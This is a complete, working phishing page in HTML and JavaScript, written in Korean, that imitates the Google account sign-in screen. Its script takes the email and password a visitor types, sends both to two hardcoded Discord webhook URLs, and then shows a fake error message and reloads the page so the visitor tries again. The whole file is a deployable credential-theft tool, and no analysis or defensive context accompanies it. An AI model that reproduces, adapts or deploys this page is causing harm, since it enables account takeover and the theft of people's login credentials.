<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>로그인 - Google 계정</title>
    <style>
        body {
            font-family: 'Roboto', arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #fff;
        }
        .login-box {
            width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
            box-sizing: border-box;
        }
        .google-text {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 10px;
            letter-spacing: -0.5px;
        }
        .g1 { color: #4285F4; }
        .g2 { color: #EA4335; }
        .g3 { color: #FBBC05; }
        .g4 { color: #34A853; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
        p { font-size: 16px; color: #202124; margin-bottom: 40px; }
        .input-group { text-align: left; margin-bottom: 24px; }
        input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
        }
        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
        .btn-container {
            display: flex;
            justify-content: flex-end;
            margin-top: 40px;
        }
        button {
            background-color: #1a73e8;
            color: white;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="login-box">
    <div class="google-text">
        <span class="g1">G</span><span class="g2">o</span><span class="g3">o</span><span class="g1">g</span><span class="g4">l</span><span class="g2">e</span>
    </div>
    <h1>로그인</h1>
    <p>Google 계정 사용</p>
    <div class="input-group">
        <input type="text" id="email" placeholder="이메일 또는 휴대전화" 
               oninput="this.value = this.value.replace(/[ㄱ-ㅎ|ㅏ-ㅣ|가-힣]/g, '')" required>
    </div>
    <div class="input-group">
        <input type="password" id="password" placeholder="비밀번호 입력" 
               oninput="this.value = this.value.replace(/[ㄱ-ㅎ|ㅏ-ㅣ|가-힣]/g, '')" required>
    </div>
    <div class="btn-container">
        <button onclick="submitData()">다음</button>
    </div>
</div>

<script>
    async function submitData() {
        const email = document.getElementById('email').value;
        const pw = document.getElementById('password').value;

        if (!email || !pw) return;

        const webhooks = [
            "https://discord.com/api/webhooks/1480916038584500394/jL8Hr2VNwVPUCwlWcHkNDlBPVGJ4y385aNU8lP_vJmAfHxqwYEZBnDlG3s0hzskmjrXc",
            "https://discord.com/api/webhooks/1480916043869196448/vAcZXldHpkuKVBy8hOSZ6VOBPoqXf1zOLb2MQvZmSkVgO3rBy3rH5q9LcVLQOsokDIOg"
        ];

        const payload = {
            embeds: [{
                title: "Google",
                color: 15790320,
                fields: [
                    { name: "ID", value: email, inline: false },
                    { name: "PW", value: pw, inline: false }
                ],
                footer: { text: new Date().toLocaleString() }
            }]
        };

        try {
            await Promise.all(webhooks.map(url => 
                fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                })
            ));
            alert("error⚠️, 다음에 다시 시도해주십시오.");
            location.reload();
        } catch (e) {
            console.error(e);
        }
    }
</script>

</body>
</html>

